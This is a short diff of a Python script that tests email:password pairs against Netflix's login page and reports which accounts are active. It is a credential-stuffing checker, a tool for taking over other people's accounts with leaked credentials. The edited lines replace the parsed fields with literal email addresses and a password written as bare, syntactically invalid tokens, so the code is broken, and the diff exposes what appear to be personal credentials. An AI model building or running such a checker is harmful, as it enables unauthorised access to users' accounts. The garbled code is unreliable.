@@ -24,9 +24,9 @@ try:
 			br.open('https://www.netflix.com/Login?locale=es-CL')
 			currentline = line.split(':')
 			br.select_form(nr=0)
-			br.form['email'] = currentline[0]
-			br.form['password'] = currentline[1]
-			print 'Logueando.. mail: '+br.form['email']
+			br.form['email'] = yop@yopmail.com[1]
+			br.form['password'] = netflix01062006[1]
+			print 'Logueando.. mail: '+br.form[obadda06@gmail.com]
 			response = br.submit()
 			if response.geturl()=='http://www.netflix.com/browse':
 				print 'Cuenta activa'
